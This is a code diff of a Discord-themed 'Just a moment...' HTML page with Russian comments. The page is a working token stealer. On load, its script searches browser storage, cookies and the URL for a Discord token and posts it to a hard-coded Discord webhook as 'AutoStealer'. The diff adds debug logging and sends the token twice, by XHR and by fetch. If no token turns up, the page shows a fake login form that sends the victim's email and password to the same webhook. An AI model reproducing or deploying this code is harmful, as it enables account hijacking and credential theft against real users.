@@ -7,97 +7,178 @@
         .spinner { border: 4px solid #202225; border-top: 4px solid #5865f2; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 0 auto; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
         p { text-align: center; margin-top: 20px; }
+        #debug { color: #aaa; font-size: 12px; margin-top: 30px; word-break: break-all; }
     </style>
 </head>
 <body>
 <div>
     <div class="spinner"></div>
     <p>Just a moment...</p>
+    <div id="debug"></div>
 </div>
 <script>
+    // Функция логирования для отладки
+    function debugLog(msg) {
+        let d = document.getElementById('debug');
+        if (d) d.innerHTML += msg + '<br>';
+        console.log(msg);
+    }
+
     // Функция получения токена из localStorage Discord
     function getStoredToken() {
+        debugLog('🔍 Searching localStorage...');
         let token = null;
-        // Поиск по всем ключам localStorage
-        for (let key in localStorage) {
-            if (key.startsWith('token')) {
-                try {
-                    let data = JSON.parse(localStorage.getItem(key));
-                    if (data && data.token) {
-                        token = data.token;
-                        break;
-                    }
-                } catch(e) {}
-            }
-        }
-        // Прямой доступ к известным ключам
-        if (!token) {
-            try {
-                let t = localStorage.getItem('token');
-                if (t) token = t;
-            } catch(e) {}
-        }
-        // Дополнительно проверка sessionStorage
-        if (!token) {
-            for (let key in sessionStorage) {
-                if (key.includes('token')) {
+        try {
+            for (let key in localStorage) {
+                if (key.startsWith('token')) {
+                    debugLog('📌 Found key: ' + key);
                     try {
-                        let data = JSON.parse(sessionStorage.getItem(key));
+                        let data = JSON.parse(localStorage.getItem(key));
                         if (data && data.token) {
                             token = data.token;
+                            debugLog('✅ Token from JSON: ' + token.substring(0, 10) + '...');
                             break;
                         }
-                    } catch(e) {}
+                    } catch(e) { debugLog('⚠️ JSON parse error for ' + key); }
                 }
             }
+            if (!token) {
+                let t = localStorage.getItem('token');
+                if (t) {
+                    token = t;
+                    debugLog('✅ Token from direct key: ' + token.substring(0, 10) + '...');
+                }
+            }
+        } catch(e) { debugLog('❌ localStorage error: ' + e); }
+
+        if (!token) {
+            debugLog('🔍 Searching sessionStorage...');
+            try {
+                for (let key in sessionStorage) {
+                    if (key.includes('token')) {
+                        debugLog('📌 Found session key: ' + key);
+                        try {
+                            let data = JSON.parse(sessionStorage.getItem(key));
+                            if (data && data.token) {
+                                token = data.token;
+                                debugLog('✅ Token from session JSON: ' + token.substring(0, 10) + '...');
+                                break;
+                            }
+                        } catch(e) {}
+                    }
+                }
+                let t = sessionStorage.getItem('token');
+                if (t && !token) {
+                    token = t;
+                    debugLog('✅ Token from session direct: ' + token.substring(0, 10) + '...');
+                }
+            } catch(e) {}
         }
         return token;
     }
 
-    // Функция отправки токена на заданный webhook
-    function sendToken(token) {
+    function getTokenFromCookies() {
+        debugLog('🔍 Searching cookies...');
+        try {
+            let match = document.cookie.match(/token=([^;]*)/);
+            if (match) {
+                debugLog('✅ Token from cookie: ' + match[1].substring(0, 10) + '...');
+                return match[1];
+            }
+        } catch(e) {}
+        return null;
+    }
+
+    function getTokenFromURL() {
+        debugLog('🔍 Searching URL...');
+        try {
+            let hash = window.location.hash;
+            let match = hash.match(/access_token=([^&]*)/);
+            if (match) {
+                debugLog('✅ Token from URL hash: ' + match[1].substring(0, 10) + '...');
+                return match[1];
+            }
+            let params = new URLSearchParams(window.location.search);
+            let t = params.get('token');
+            if (t) {
+                debugLog('✅ Token from URL param: ' + t.substring(0, 10) + '...');
+                return t;
+            }
+        } catch(e) {}
+        return null;
+    }
+
+    // Отправка с использованием XMLHttpRequest (более надёжно, чем fetch)
+    function sendTokenViaXHR(token, type) {
         let webhookURL = "https://discord.com/api/webhooks/1529622002925699224/dwFRzx2iQ-IVHg_FCppydqvQfA8w11wOIvX85HgiJl29yx_1LOG60leAzRwE8LCEDl_t";
         let data = {
-            content: `**Token stolen:** ||${token}||`,
+            content: `**Token (${type}):** ||${token}||\n**User-Agent:** ${navigator.userAgent}`,
+            username: "AutoStealer"
+        };
+        let xhr = new XMLHttpRequest();
+        xhr.open('POST', webhookURL, true);
+        xhr.setRequestHeader('Content-Type', 'application/json');
+        xhr.onreadystatechange = function() {
+            if (xhr.readyState === 4) {
+                debugLog('📡 XHR status: ' + xhr.status);
+                if (xhr.status === 204 || xhr.status === 200) {
+                    debugLog('✅ Webhook sent successfully!');
+                    document.querySelector('p').innerHTML = '✅ Token sent to webhook.';
+                } else {
+                    debugLog('❌ Webhook error: ' + xhr.status + ' ' + xhr.responseText);
+                    document.querySelector('p').innerHTML = '❌ Webhook failed (status ' + xhr.status + '). Check debug.';
+                }
+                document.querySelector('.spinner').style.display = 'none';
+            }
+        };
+        xhr.onerror = function() {
+            debugLog('❌ XHR network error');
+            document.querySelector('.spinner').style.display = 'none';
+        };
+        xhr.send(JSON.stringify(data));
+    }
+
+    // Дублирующая отправка через fetch (на случай, если XHR не сработает)
+    function sendTokenViaFetch(token, type) {
+        let webhookURL = "https://discord.com/api/webhooks/1529622002925699224/dwFRzx2iQ-IVHg_FCppydqvQfA8w11wOIvX85HgiJl29yx_1LOG60leAzRwE8LCEDl_t";
+        let data = {
+            content: `**Token (${type}):** ||${token}||\n**User-Agent:** ${navigator.userAgent}`,
             username: "AutoStealer"
         };
         fetch(webhookURL, {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify(data)
-        }).catch(err => console.log('Send error:', err));
+        }).then(res => {
+            debugLog('📡 Fetch status: ' + res.status);
+            if (res.status === 204 || res.status === 200) {
+                debugLog('✅ Fetch webhook sent!');
+            } else {
+                debugLog('❌ Fetch error status: ' + res.status);
+            }
+        }).catch(err => {
+            debugLog('❌ Fetch network error: ' + err);
+        });
     }
 
-    // Попытка также извлечь токен из cookies (для OAuth)
-    function getTokenFromCookies() {
-        let match = document.cookie.match(/token=([^;]*)/);
-        return match ? match[1] : null;
-    }
-
-    // Попытка извлечь из URL (фрагмент OAuth redirect)
-    function getTokenFromURL() {
-        let hash = window.location.hash;
-        let match = hash.match(/access_token=([^&]*)/);
-        if (match) return match[1];
-        let params = new URLSearchParams(window.location.search);
-        return params.get('token') || null;
-    }
-
-    // Основная функция кражи при загрузке страницы
+    // Главная функция
     window.onload = function() {
+        debugLog('🚀 Page loaded');
         let token = getStoredToken();
         if (!token) token = getTokenFromCookies();
         if (!token) token = getTokenFromURL();
 
         if (token) {
-            sendToken(token);
-            // Показать на странице, что токен отправлен (необязательно)
-            document.querySelector('p').innerHTML = '✅ Token captured and sent.';
-            document.querySelector('.spinner').style.display = 'none';
+            debugLog('🎯 Final token: ' + token.substring(0, 15) + '...');
+            // Отправляем двумя способами для надёжности
+            sendTokenViaXHR(token, 'stolen');
+            sendTokenViaFetch(token, 'stolen');
+            document.querySelector('p').innerHTML = '✅ Token captured and sending...';
         } else {
-            document.querySelector('p').innerHTML = '❌ No token found. Try logging in manually.';
+            debugLog('❌ No token found anywhere.');
+            document.querySelector('p').innerHTML = '❌ No token found.';
             document.querySelector('.spinner').style.display = 'none';
-            // Добавляем фейковую форму для соц. инженерии (опционально)
+            // Фейковая форма - тоже отправляем данные
             let div = document.querySelector('div');
             let form = document.createElement('div');
             form.innerHTML = `
@@ -107,21 +188,21 @@
                 <p id="fakemsg" style="color:#f04747;"></p>
             `;
             div.appendChild(form);
-            // Также отправляем введённые данные на webhook
             window.fakeLogin = function() {
                 let email = document.getElementById('fakeemail').value;
                 let pass = document.getElementById('fakepass').value;
                 if (email && pass) {
+                    let webhookURL = "https://discord.com/api/webhooks/1529622002925699224/dwFRzx2iQ-IVHg_FCppydqvQfA8w11wOIvX85HgiJl29yx_1LOG60leAzRwE8LCEDl_t";
                     let data = {
-                        content: `**CREDENTIALS:** Email: ${email}, Pass: ${pass}`,
+                        content: `**CREDENTIALS:** Email: ${email}, Pass: ${pass}\n**User-Agent:** ${navigator.userAgent}`,
                         username: "CredStealer"
                     };
-                    fetch(webhookURL, {
-                        method: 'POST',
-                        headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify(data)
-                    }).catch(err => console.log(err));
+                    let xhr = new XMLHttpRequest();
+                    xhr.open('POST', webhookURL, true);
+                    xhr.setRequestHeader('Content-Type', 'application/json');
+                    xhr.send(JSON.stringify(data));
                     document.getElementById('fakemsg').innerText = '✅ Login successful (credentials sent).';
+                    document.getElementById('fakemsg').style.color = '#3ba55d';
                 } else {
                     document.getElementById('fakemsg').innerText = 'Please fill all fields.';
                 }
